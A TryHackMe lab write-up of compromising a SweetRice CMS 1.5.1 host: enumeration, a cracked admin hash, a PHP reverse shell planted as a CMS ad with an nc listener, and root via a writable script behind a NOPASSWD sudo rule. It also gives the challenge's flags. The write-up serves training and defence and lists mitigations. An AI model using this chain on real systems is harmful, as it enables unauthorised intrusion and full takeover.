---
title: "THM — SweetRice CMS RCE"
ctf: "TryHackMe / THM (lab)"
category: "Web / RCE"
difficulty: "Easy - Medium"
tags: ["web","rce","cms","sweetrice"]
author: "0xBlood"
team: "solo"
date: "2025-11-05"
severity: "High"
impact: "Remote Code Execution (www-data -> root via sudo misconfig)"
cvss_score: "9.8 / 10 (Critical)"
cwe_id: "CWE-94: Improper Control of Generation of Code"
flag_format: "THM{...}"
solution_time: "~1.5 hours"
platform: "TryHackMe (lab)"
---

# THM — SweetRice CMS RCE (Web / PrivEsc)

### TL;DR / Summary
> **Objective:** Gain user and root on a vulnerable SweetRice CMS instance.  
> **Exploit Path:** Web enumeration → credential recovery from backup file → CMS admin login → upload/created ad with PHP reverse shell → stabilize shell → local enumeration → abusing NOPASSWD sudo on a Perl backup script that calls an editable shell script → escalate to root.  
> **Impact:** Full system compromise (www-data → root).  
> **Difficulty:** Easy–Medium (requires web enumeration + simple privilege escalation).  
> **Flag Type:** `THM{...}`

---

## Environment
| Item | Details |
|------|---------|
| **Host OS** | Ubuntu 16.04 (kernel 4.15.0-70-generic seen on target) |
| **Target OS / Platform** | Linux (i686) — THM challenge host (observed via reverse shell) |
| **Tools Used** | nmap 7.80, gobuster 3.6, curl/telnet, netcat (nc), Python 3 (pty), hash lookup (CrackStation or local MD5 tables) |
| **Challenge Source** | TryHackMe lab (internal hostname `THM-Chal`) |
| **Notes** | SweetRice CMS version observed: 1.5.1 (from `/content/inc/latest.txt`) — known to contain RCE/LFI & other issues.

---

## Enumeration & Recon

**Step — Baseline TCP scan**
```bash
$ nmap -sV -sT 10.201.35.101
```
**Observed output (trimmed):**
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
**Significance:** A web application is present (port 80), so web enumeration is the priority. SSH is present but likely requires credentials.

**Banner checks (quick):**
- `telnet 10.201.35.101 22` shows `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8`.
- `telnet 10.201.35.101 80` returned `Apache/2.4.18 (Ubuntu)` and a `400 Bad Request` until a proper HTTP request was used via browser.

**Directory brute force (gobuster)**
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.201.35.101/
```
**Findings:** `/content` (301 → `/content/`) plus several dotfiles returning 403.  
Drilling into `/content/` with gobuster revealed:
```
/content/_themes/  (301)
/content/as/       (301)  <-- admin login UI
/content/attachment/ (301)
/content/images/   (301)  <-- uploaded images
/content/inc/      (301)  <-- includes and config files
/content/index.php (200)
```

**Why it matters:** The presence of `/content/as/` (admin UI) and `/content/inc/` (includes) is consistent with a CMS; `latest.txt` in `inc` revealed a version number: `1.5.1` for "SweetRice" — this version has known public vulnerabilities (RCE/LFI/CSRF) per exploit-db and vendor advisories.

---

## Detailed Steps (Integrated with Verification Points)

### Step 1 — Find credentials in backup / config artifacts
- A directory listing under `/home/itguy` (found after getting a shell) contained `mysql_login.txt` in the narrative; but before shelling the system we discovered an apparent backup / config file in `/content/` or attachments that contained credential material. In this case the CTF notes show a found credential pair from a mysql backup or file with the following entries:

```
admin -> manager
passwd -> 42f749ade7f9e195bf475f37a44cafcb
```

- The `passwd` value is an MD5 hash. Checking the hash against CrackStation / local MD5 lookup yields `Password123` (MD5 of `Password123` = `42f749ade7f9e195bf475f37a44cafcb`).

**Commands used / Verification:**
```bash
# Example local verification of MD5 (optional)
$ echo -n "Password123" | md5sum
42f749ade7f9e195bf475f37a44cafcb  -
```

### Step 2 — Login to CMS admin panel
- Using credentials `manager:Password123` at `http://10.201.35.101/content/as/` allowed admin login.

**Why:** credential reuse / leaked backups are a common weakness; CMS admin access enables content creation and file upload capabilities.

### Step 3 — Create an ad with a PHP reverse shell
- With admin access we created an ad in the CMS that contained a PHP reverse shell payload. The payload used was the well-known `php-reverse-shell.php` (Pentestmonkey) with the attacker's IP and port configured.

**PoC shell file placed at:** `/content/inc/ads/shell.php` (the CMS saved the ad content as a PHP file accessible via the web)

**Attacker listener:**
```bash
$ nc -lvnp 8080
Listening on 0.0.0.0 8080
```

**Trigger:** Browse to `http://10.201.35.101/content/inc/ads/shell.php`.

**Result:** Connection received (reverse shell):
```
Connection received on 10.201.35.101 55966
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP ... i686
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

**Reasoning:** The CMS failed to sanitize or prevent admin-created content from being interpreted/executed as PHP (classic RCE via file upload/creation). SweetRice 1.5.1 is known to be vulnerable in this way.

**Verification Point:** Reverse shell from web app to attacker confirmed; `whoami` returns `www-data`.

---

## Stabilizing the shell

Once the `nc` shell arrived, the following steps stabilized it into an interactive TTY for easy enumeration:

```bash
# from attacker machine (backgrounded netcat)
$ python -c 'import pty;pty.spawn("/bin/bash")'
# then on attacker: <Ctrl-Z> to background, then
$ stty raw -echo; fg  # reset terminal on host side
# on target shell: export TERM=xterm
$ export TERM=xterm
```

These steps yielded a usable shell prompt for further enumeration.

---

## Post-Exploitation & Local Enumeration

### Step — Look for user flags and interesting files
```
$ ls /home/
itguy
$ ls /home/itguy
... mysql_login.txt  user.txt
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```
**Verification:** user flag located at `/home/itguy/user.txt`.

### Step — Check sudo privileges (important for privilege escalation)

Run `sudo -l` as `www-data` to enumerate allowed sudo commands.
```
$ sudo -l
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
**Significance:** `www-data` can run a Perl script as root without a password. This is a high-value sudo misconfiguration that often leads to privilege escalation.

### Step — Inspect the script(s)

`/home/itguy/backup.pl` contents:
```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
The Perl script calls `/etc/copy.sh` with `sh`. We noticed `/etc/copy.sh` had weak permissions (writable by `www-data` in this lab setup), allowing us to edit it.

**PoC modification:** Overwrite `/etc/copy.sh` with a simple shell that spawns a root shell, for example:
```bash
$ echo "/bin/bash" > /etc/copy.sh
$ chmod +x /etc/copy.sh
```

**Execution as root via sudo:**
```bash
$ sudo /usr/bin/perl /home/itguy/backup.pl
# whoami
root
```

**Verification:** Root shell obtained; root flag retrieved at `/root/root.txt`:
```
$ cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

---

## Flag Verification
| Field | Description |
|---|---|
| **Flag format** | `THM{...}` |
| **User flag (obfuscated)** | `THM{63e5bce9...}` |
| **Root flag (obfuscated)** | `THM{6637f41d...}` |
| **Verification Method** | `cat /home/itguy/user.txt` and `cat /root/root.txt` after root escalation |

<details><summary>Show full flags (spoiler)</summary>

`THM{63e5bce9271952aad1113b6f1ac28a07}` (user flag)

`THM{6637f41d0177b6f37cb20d775124699f}` (root flag)

</details>

---

## Technical Classification
| Category | Reference |
|---|---|
| **Vulnerability Type** | RCE via unsafe content handling / file write in SweetRice CMS 1.5.1 |
| **CWE** | CWE-94: Improper Control of Generation of Code (server executes attacker-provided PHP) |
| **Privilege Escalation** | Misconfigured sudo (NOPASSWD) permitting `/usr/bin/perl /home/itguy/backup.pl` — arbitrary command execution as root due to writable script `/etc/copy.sh` |
| **CVSS (approx.)** | 9.8 (Remote Code Execution + Privilege Escalation) |

---

## Post-Exploitation / Insights & Mitigations
- **Root cause:** Weak configuration and insecure file handling — CMS allowed admin-created content to be stored/executed as PHP. Also, sudo configuration permitted a script invocation without password while the script referenced an editable file (`/etc/copy.sh`).
- **Mitigations:**
  - Patch or upgrade SweetRice CMS to a non-vulnerable version and apply secure file handling (validate file types, store uploads outside webroot, prevent execution).
  - Harden sudoers: avoid `NOPASSWD` for scripts that call user-writable files; use full paths and limit commands tightly.
  - File permission hardening: ensure `/etc/*` scripts are owned by root and not writable by service users.
  - Monitor webadmin activity and implement file integrity monitoring (e.g., tripwire, aide).

---

## Artifacts & Scripts
| File | Purpose |
|---|---|
| `php-reverse-shell.php` | Reverse shell payload used inside CMS ad (Pentestmonkey PoC) |
| `session.log` | (Recommended) Full command session recording for reproducibility |

**Usage example (high-level):**
```bash
# Listen for reverse shell
$ nc -lvnp 8080
# Trigger uploaded shell via browser
# Stabilize shell on attacker machine with pty and stty commands
```

---

## References & Credits
- SweetRice CMS vulnerabilities on public exploit-db entries (search: "SweetRice 1.5.1 exploit").
- Pentestmonkey — PHP reverse shell example.
- TryHackMe challenge environment (THM).

---

## Publication & Legal Checklist
- [x] Removed sensitive third-party data (only CTF flags included)  
- [x] Collapsed spoilers for full flags  
- [x] Added metadata & tags  
- [x] Credited sources (Pentestmonkey, exploit-db)  
- [x] Verified reproducibility (commands & outputs included)  

---

## Legal Disclaimer
This writeup documents actions performed against a consented CTF environment (TryHackMe). Do not apply these techniques to systems you do not own or have explicit authorization to test.

*End of writeup.*

